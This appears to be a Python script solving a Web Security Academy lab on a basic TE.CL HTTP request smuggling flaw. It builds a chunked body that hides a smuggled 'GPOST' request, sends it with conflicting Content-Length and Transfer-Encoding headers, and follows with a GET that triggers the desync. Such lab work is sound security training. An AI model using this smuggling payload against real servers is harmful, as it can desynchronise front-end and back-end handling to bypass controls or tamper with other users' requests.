# HTTP request smuggling, basic TE.CL vulnerability

import requests

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080",
}
url = "https://0af700d304a7bd53c0ff3e7b000100e8.web-security-academy.net/"

payload1 = """GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1"""
length = hex(len(payload1.replace('\n', '\r\n'))).split('x')[1]

PAYLOAD = f"""{length}
{payload1}
0\r\n\r\n"""

print(PAYLOAD)

headers = {
    "Content-Length": "4",
    "Transfer-encoding": "chunked",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
}

s = requests.Session()

# r1 = s.post(url, headers=headers, data=PAYLOAD, proxies=proxies, verify=False)
# r2 = s.post(url, headers=headers, data=PAYLOAD, proxies=proxies, verify=False)
r1 = s.post(url, headers=headers, data=PAYLOAD)
r2 = s.get(url)
print(r1.status_code)
# print(r1.headers)
print(r1.text)
print(r2.status_code)
print(r2.headers)
# print(r2.text)
